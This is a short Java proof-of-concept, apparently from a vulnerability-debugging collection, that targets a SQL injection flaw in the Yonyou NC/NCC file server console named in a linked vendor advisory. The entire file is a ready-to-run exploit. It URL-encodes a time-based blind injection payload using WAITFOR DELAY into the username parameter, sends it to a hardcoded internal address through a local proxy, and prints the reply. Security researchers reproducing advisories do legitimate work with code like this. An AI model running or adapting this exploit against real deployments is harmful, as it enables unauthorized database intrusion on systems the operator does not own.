package cve.nccloud;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpGet;

import java.io.IOException;
import java.net.URLEncoder;

/**
 * 漏洞：
 * NC/NCC文件服务器配置管理存在SQL注入漏洞
 * https://security.yonyou.com/#/noticeInfo?id=213
 */
public class fs_sqli {


    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.205/fs/console";
        String sql = "222';WAITFOR DELAY '0:0:5 --";
        String params = new StringBuilder().append("?username=").append(URLEncoder.encode(sql)).append("&password=%2Bz3VgEDJpVuEHdRPPzbCFTCa9Q0sKLOZ5q4ZLhxjuok%3D").toString();

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpGet httpGet = new HttpGet(url + params);
        Response response = httpRequest.sendGet(httpGet);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());
    }

}
